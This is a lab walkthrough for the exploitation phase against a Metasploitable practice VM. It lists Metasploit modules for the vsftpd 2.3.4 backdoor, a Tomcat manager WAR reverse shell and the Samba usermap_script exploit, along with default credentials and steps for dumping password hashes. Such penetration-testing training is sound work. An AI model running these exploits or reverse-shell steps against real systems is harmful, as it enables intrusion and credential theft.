üí• Exploitation ‚Äì Metasploitable

In this phase, we use the results from enumeration to gain initial access to the target system through various vulnerable services and web applications.

---

## ‚ö° 1. Exploiting FTP (vsftpd 2.3.4)

This version contains a known backdoor that opens a shell on port 6200 when logging in with a username containing `:)`.

### ‚û§ Metasploit Exploit:
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.109
run
````

‚úÖ This gives you a limited shell.

---

## üü¢ 2. Telnet Access (Weak Credentials)

Login with default credentials:

```bash
telnet 192.168.1.109
```

Username: `msfadmin`
Password: `msfadmin`

‚úÖ You get shell access with user privileges.

---

## üåê 3. Web App: phpMyAdmin

Visit: `http://192.168.1.109/phpmyadmin`

Try default login:

* `root` with no password

If successful:

* Access full MySQL database
* Dump usernames and password hashes
* Brute force or reuse them for login (e.g., SSH, web apps)

---

## üîê 4. Tomcat Manager (Port 8180)

Visit: `http://192.168.1.109:8180/manager/html`

Try credentials:

* `tomcat:tomcat`
* `admin:admin`

If successful:

### ‚û§ Upload a WAR Reverse Shell (Metasploit)

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOST 192.168.1.109
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
set RPORT 8180
set LHOST <your IP>
run
```

‚úÖ This gives a Meterpreter shell.

---

## üóÉÔ∏è 5. Samba Exploitation (Null Session)

From `enum4linux` or `smbclient`, if a share like `/tmp` or `/public` is writable:

```bash
smbclient //192.168.1.109/tmp -N
```

You can upload a reverse shell or try exploits such as:

```bash
use exploit/multi/samba/usermap_script
```

---

## üåê 6. Mutillidae / DVWA (on port 80)

These are intentionally vulnerable web apps.

* Try SQL Injection (DVWA login)
* File upload (Mutillidae or DVWA)
* XSS and Command Injection

> These are practice apps and won't give you full system access but help in learning exploitation.

## üéØ Successful Shell Access Methods

| Method         | Technique                               | Access Level  |
| -------------- | --------------------------------------- | ------------- |
| FTP Backdoor   | vsftpd 2.3.4 exploit via MSF            | Limited shell |
| Telnet         | Weak credentials `msfadmin:msfadmin`    | User shell    |
| Tomcat Manager | WAR upload via Metasploit               | Meterpreter   |
| Samba          | Writable share or remote code execution | Varies        |
